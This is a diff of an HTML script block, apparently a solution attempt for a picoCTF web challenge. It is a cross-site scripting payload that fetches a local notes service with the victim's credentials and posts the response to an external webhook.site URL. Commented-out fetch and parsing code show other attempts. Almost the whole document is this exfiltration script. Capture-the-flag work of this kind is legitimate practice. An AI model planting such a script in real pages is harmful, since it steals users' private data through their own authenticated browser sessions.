@@ -1,17 +1,43 @@
 <script>
 var req = new XMLHttpRequest();
 
-req.open('GET', 'http://0.0.0.0:8080/notes', false);
-req.send(null);
-var a = ''
+req.open('GET', 'http://0.0.0.0:8080', false);
+req.withCredentials = true
+// req.open('GET', 'http://saturn.picoctf.net:62774', false);
+req.send();
+var a = req;
 if(req.status == 200) {
   a = req.responseText;
 }
 else {
   a = req.statusText;
+  alert(req.statusText)
 }
 // var a = '1234'
 var req_webhook = new XMLHttpRequest();
 req_webhook.open('POST', `https://webhook.site/be1f8c0e-24d7-4dcd-a109-098da8ae468f`, false);
 req_webhook.send(a);
+
+// fetchNotes()
+
+// async function fetchNotes() {
+//   const response = await fetch('http://saturn.picoctf.net:62774',{mode: 'no-cors'}).then(function({
+
+//   }));
+//   // waits until the request completes...
+//   console.log(response.text());
+// }
+
+// fetchNotes().then(answer => {
+//   var parser = new DOMParser();
+
+//       // Parse the text
+//       var doc = parser.parseFromString(answer, "text/html");
+
+//       // You can now even select part of that html as you would in the regular DOM 
+//       // Example:
+//       // var docArticle = doc.querySelector('article').innerHTML;
+
+//       console.log(answer);
+// });
   </script>
